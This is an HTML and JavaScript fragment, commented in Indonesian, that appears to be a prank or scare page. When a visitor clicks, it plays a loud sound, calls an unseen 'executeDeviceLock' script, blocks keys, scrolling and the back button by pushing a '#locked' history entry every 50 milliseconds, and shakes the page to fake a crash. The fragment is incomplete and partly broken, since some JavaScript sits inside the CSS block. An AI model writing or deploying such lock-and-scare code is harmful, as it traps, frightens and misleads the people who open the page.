    <style>
        /* Block semua interaksi keluar */
        body {
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            margin: 0;
            background: #000;
        }
        .fullscreen-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('1000387313.jpg') no-repeat center center fixed;
            background-size: cover;
            cursor: pointer;
        }
        .content {

            color: white;
            text-align: center;
            padding-top: 50px;
        }
        /* Disable back button & context menu */
        body.oncontextmenu = function() { return false; }
        document.onkeydown = function(e) {
            if (e.key === 'Backspace' || e.key === 'Escape' || e.key === 'F5') {
                e.preventDefault();
                return false;
            }
        }
    </style>
</head>

    <!-- Sound Effect -->

    </audio>

    <!-- Scripts -->
    <script src="lock-script.js"></script>
    <script>
        // Trigger saat gambar diklik
        document.getElementById('trigger').addEventListener('click', function() {
            // Play sound
            const sound = document.getElementById('boom-sound');
            sound.volume = 1.0;
            sound.play();
            
            // Execute device lock script
            executeDeviceLock();
            
            // Halaman mulai freeze
            startFreeze();
        });

        function startFreeze() {
            // Block semua event
            document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
            document.addEventListener('mousewheel', function(e) { e.preventDefault(); }, { passive: false });
            
            // Redirect terus menerus
            setInterval(() => {
                window.history.pushState({}, '', '#locked');
            }, 50);
            
            // Overlay merah
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.background = 'rgba(255, 0, 0, 0.3)';
            overlay.style.zIndex = '9999';
            overlay.style.pointerEvents = 'none';
            document.body.appendChild(overlay);
            
            // Crash effect
            setInterval(() => {
                document.body.style.transform = `translate(${Math.random()*10}px, ${Math.random()*10}px)`;
            }, 100);
        }
    </script>
